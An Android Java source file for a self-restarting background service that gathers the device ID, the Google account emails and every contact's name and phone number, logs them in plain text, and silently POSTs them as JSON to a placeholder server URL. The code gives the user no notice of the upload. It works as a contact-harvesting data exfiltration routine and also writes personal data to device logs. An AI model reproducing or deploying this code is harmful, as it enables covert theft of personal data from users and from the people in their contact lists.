package com.ankit.serverconnect;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

public class ConnectionService extends Service {

    private static String getStringFromInputStream(InputStream is) {

        BufferedReader br = null;
        StringBuilder sb = new StringBuilder();

        String line;
        try
        {
            br = new BufferedReader(new InputStreamReader(is));
            while ((line = br.readLine()) != null)
            {
                sb.append(line);
            }

        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
        finally
        {
            if (br != null)
            {
                try
                {
                    br.close();
                } catch (IOException e)
                {
                    e.printStackTrace();
                }
            }
        }

        return sb.toString();

    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        new PostData().execute("URL to server page to receive data..");
        return START_STICKY;
    }
    @Override
    public IBinder onBind(Intent intent)
    {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    private class PostData extends AsyncTask
    {
        private JSONObject readContacts(JSONObject json)
        {
            JSONArray email = new JSONArray();
            HashMap<String,List<String>> contactsMap = new HashMap<>();
            Account[] accountList = {};
            int permissionCheck = ContextCompat.checkSelfPermission(getApplicationContext(),
                    Manifest.permission.GET_ACCOUNTS);
            if(permissionCheck ==  PackageManager.PERMISSION_GRANTED)
                accountList = AccountManager.get(getApplicationContext()).getAccountsByType("com.google");
            else
            {
                Log.i("ConnectionAnkit", "Permission Not Given to access accounts.");
            }
                Log.i("ConnectionAnkit","Found "+accountList.length+" accounts..");
            for (Account anAccountList : accountList)
            {
                email.put(anAccountList.name);
                Log.i("ConnectionAnkit",anAccountList.name);
            }

            int permissionContact = ContextCompat.checkSelfPermission(getApplicationContext(),
                    Manifest.permission.READ_CONTACTS);
            if(permissionContact != PackageManager.PERMISSION_GRANTED)
            {
                Log.i("ConnectionAnkit","Permission Was Not Given");
                return null;
            }
            ContentResolver cr = getContentResolver();
            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null);
            if ((cur != null ? cur.getCount() : 0) > 0)
            {
                while (cur != null && cur.moveToNext())
                {
                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    if (Integer.parseInt(cur.getString(
                            cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                        Cursor pCur = cr.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
                                new String[]{id}, null);
                        while (pCur != null && pCur.moveToNext())
                        {
                            String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            List<String> s = contactsMap.get(name);
                            if(s!=null)
                                s.add(phoneNo);
                            else
                            {
                                s = new ArrayList<>();
                                s.add(phoneNo);
                            }
                            contactsMap.put(name,s);
                            Log.i("ConnectionAnkit","Name: " + name + ", Phone No: " + phoneNo);
                        }
                        if (pCur != null)
                        {
                            pCur.close();
                        }
                    }
                }
            }
            if (cur != null)
            {
                cur.close();
            }
            try
            {
                JSONObject contactsJSON = new JSONObject(contactsMap);
                json.put("emails",email);
                json.put("contacts",contactsJSON);
                Log.i("ConnectionAnkit",json.toString());
            } catch (JSONException e)
            {
                Log.i("ConnectionAnkit",e.toString());
            }
            return json;
        }


        @Override
        protected String doInBackground(Object[] urls)
        {
            OutputStream os = null;
            InputStream is = null;
            HttpURLConnection conn = null;
            try
            {
                URL url = new URL(urls[0].toString());
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("Device", Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID));
                jsonObject = readContacts(jsonObject);
                String message = null;
                if (jsonObject != null)
                {
                    message = jsonObject.toString();
                }
                conn = (HttpURLConnection) url.openConnection();
                conn.setReadTimeout( 10000);
                conn.setConnectTimeout( 15000);
                conn.setRequestMethod("POST");
                conn.setDoInput(true);
                conn.setDoOutput(true);
                conn.setFixedLengthStreamingMode(message != null ? message.getBytes().length : 0);

                conn.setRequestProperty("Content-Type", "application/json;charset=utf-8");
                conn.setRequestProperty("X-Requested-With", "XMLHttpRequest");

                conn.connect();

                os = new BufferedOutputStream(conn.getOutputStream());
                os.write(message != null ? message.getBytes() : new byte[0]);
                os.flush();

                is = conn.getInputStream();
                Log.i("ConnectionAnkit",getStringFromInputStream(is));

            }
            catch (IOException e)
            {
                Log.i("ConnectionAnkit",e.toString());
            }
            catch (Exception e)
            {
                Log.i("ConnectionAnkit",e.toString());
            }
            finally
            {
                try
                {
                    if (os != null)
                        os.close();
                    if (is != null)
                        is.close();
                }
                catch (IOException e)
                {
                    e.printStackTrace();
                }
                if (conn != null)
                    conn.disconnect();
            }
            onPostExecute();
            return null;
        }
        private void onPostExecute()
        {
            Log.i("ConnectionAnkit","PostExecute");
            stopSelf();
        }
    }

    private class DownloadTask extends AsyncTask
    {
        @Override
        protected String doInBackground(Object[] urls)
        {
            URL url;
            InputStream in;
            HttpURLConnection urlConnection = null;
            try
            {
                url = new URL(urls[0].toString());
                urlConnection = (HttpURLConnection) url.openConnection();
                in = new BufferedInputStream(urlConnection.getInputStream());
                byte[] contents = new byte[1024];

                int bytesRead;
                String strFileContents="";
                while((bytesRead = in.read(contents)) != -1)
                {
                    strFileContents += new String(contents, 0, bytesRead);
                }

                Log.i("ConnectionAnkit",strFileContents);
            }
            catch (Exception e)
            {
                Toast.makeText(getBaseContext(),"Check Your Network Connection..",Toast.LENGTH_LONG).show();
                Log.i("ConnectionAnkit","Error in connecting..\n"+e.toString());
            }
            finally
            {
                if(urlConnection!=null)
                    urlConnection.disconnect();
            }
            onPostExecute();
            return null;
        }

        private void onPostExecute() {
            Log.i("ConnectionAnkit","PostExecute");

        }
    }
}